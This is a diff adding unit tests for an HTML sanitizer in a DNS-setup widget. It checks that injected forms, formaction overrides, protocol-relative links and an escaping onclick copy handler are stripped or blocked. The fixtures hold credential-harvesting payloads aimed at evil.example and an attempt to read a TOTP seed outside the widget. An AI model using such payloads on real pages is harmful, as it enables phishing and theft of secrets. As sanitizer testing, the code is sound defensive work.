@@ -36,6 +36,7 @@ interface ApxDnsWidget {
   escapeHtml: (value: unknown) => string;
   _cssEscape: (value: unknown) => string;
   _compileTrustedHandler: (value: unknown) => (() => void) | null;
+  _resolveElementChain: (start: Element, expr: string) => Element | null;
   sanitizeHtmlToFragment: (html: unknown) => DocumentFragment;
   insertSanitizedHtml: (parent: Element, html: unknown) => void;
   renderProviderInstructions: (data: unknown) => void;
@@ -129,6 +130,55 @@ describe('dnswidget.v1 sanitization [M-4]', () => {
       expect(anchors[1].getAttribute('href')).toBeNull();
       expect(anchors[2].getAttribute('href')).toBe('https://approximated.app/help');
       expect(anchors[3].getAttribute('href')).toBe('/relative/path');
+    });
+
+    it('neutralizes form-submission primitives in API fragments', () => {
+      const frag = apxDns().sanitizeHtmlToFragment(
+        '<form action="https://evil.example/harvest" method="post" class="apxdns-form">' +
+          '<input type="password" name="password" form="outer-form">' +
+          '<button type="submit" formaction="https://evil.example/alt">Login</button>' +
+          '</form>'
+      );
+      widget.appendChild(frag);
+
+      // The FORM element itself must not survive, nor any submission target.
+      expect(widget.querySelector('form')).toBeNull();
+      expect(widget.querySelector('[action]')).toBeNull();
+      expect(widget.querySelector('[formaction]')).toBeNull();
+
+      // Children survive (unwrapped) but are inert: no form association via
+      // ancestor or the `form` content attribute.
+      const input = widget.querySelector('input');
+      expect(input).not.toBeNull();
+      expect(input?.getAttribute('form')).toBeNull();
+      expect(input?.form).toBeNull();
+      expect(widget.querySelector('button')?.textContent).toBe('Login');
+    });
+
+    it('strips action even on non-form elements', () => {
+      const frag = apxDns().sanitizeHtmlToFragment(
+        '<div action="https://evil.example">x</div>'
+      );
+      widget.appendChild(frag);
+      expect(widget.querySelector('[action]')).toBeNull();
+    });
+
+    it('rejects protocol-relative URLs on href and src', () => {
+      const frag = apxDns().sanitizeHtmlToFragment(
+        '<a href="//evil.example/phish">pr</a>' +
+          '<a href="/\\evil.example">backslash</a>' +
+          '<a href="\\\\evil.example">unc</a>' +
+          '<img src="//evil.example/x.png">' +
+          '<a href="/ok/path">fine</a>'
+      );
+      widget.appendChild(frag);
+
+      const anchors = widget.querySelectorAll('a');
+      expect(anchors[0].getAttribute('href')).toBeNull();
+      expect(anchors[1].getAttribute('href')).toBeNull();
+      expect(anchors[2].getAttribute('href')).toBeNull();
+      expect(widget.querySelector('img')?.getAttribute('src')).toBeNull();
+      expect(anchors[3].getAttribute('href')).toBe('/ok/path');
     });
 
     it('hardens target=_blank anchors and drops other targets', () => {
@@ -248,6 +298,79 @@ describe('dnswidget.v1 sanitization [M-4]', () => {
           "window.apxDns.copyInputText(this.ownerDocument.defaultView.alert(1))"
         )
       ).toBeNull();
+    });
+  });
+
+  describe('_resolveElementChain', () => {
+    it('resolves allowlisted chains within the widget', () => {
+      widget.innerHTML =
+        '<div class="apxdns-input-copy-container">' +
+        '<input type="text" value="76.76.21.21">' +
+        '<button type="button">Copy</button></div>';
+      const button = widget.querySelector('button')!;
+
+      const target = apxDns()._resolveElementChain(
+        button,
+        "this.parentElement.querySelector('input')"
+      );
+      expect(target).toBe(widget.querySelector('input'));
+    });
+
+    it('rejects selectors outside the compile-time allowlist', () => {
+      widget.innerHTML = '<div><input name="totp"><button>Copy</button></div>';
+      const button = widget.querySelector('button')!;
+
+      // Attribute selectors ([...]) are outside the allowlisted charset.
+      expect(
+        apxDns()._resolveElementChain(
+          button,
+          "this.parentElement.querySelector('input[name=totp]')"
+        )
+      ).toBeNull();
+
+      // Selectors beyond the 128-char cap never parse.
+      const long = 'a'.repeat(200);
+      expect(
+        apxDns()._resolveElementChain(button, `this.querySelector('${long}')`)
+      ).toBeNull();
+    });
+
+    it('refuses chains that escape the widget container', () => {
+      const outside = document.createElement('input');
+      outside.id = 'outside-secret';
+      outside.value = 'TOTP-SEED-VALUE';
+      document.body.appendChild(outside);
+
+      widget.innerHTML = '<div><button>Copy</button></div>';
+      const button = widget.querySelector('button')!;
+
+      expect(
+        apxDns()._resolveElementChain(
+          button,
+          "this.parentElement.parentElement.parentElement.querySelector('#outside-secret')"
+        )
+      ).toBeNull();
+    });
+
+    it('compiled copy handlers cannot copy content outside the widget', () => {
+      const outside = document.createElement('input');
+      outside.id = 'outside-secret';
+      outside.value = 'TOTP-SEED-VALUE';
+      document.body.appendChild(outside);
+
+      const copySpy = vi.fn();
+      const original = apxDns().copyInputText;
+      apxDns().copyInputText = copySpy;
+      try {
+        apxDns().insertSanitizedHtml(
+          widget,
+          `<button onclick="window.apxDns.copyInputText(this.parentElement.parentElement.parentElement.querySelector('#outside-secret'))">Copy</button>`
+        );
+        widget.querySelector('button')?.dispatchEvent(new MouseEvent('click', { bubbles: true }));
+        expect(copySpy).not.toHaveBeenCalled();
+      } finally {
+        apxDns().copyInputText = original;
+      }
     });
   });
 
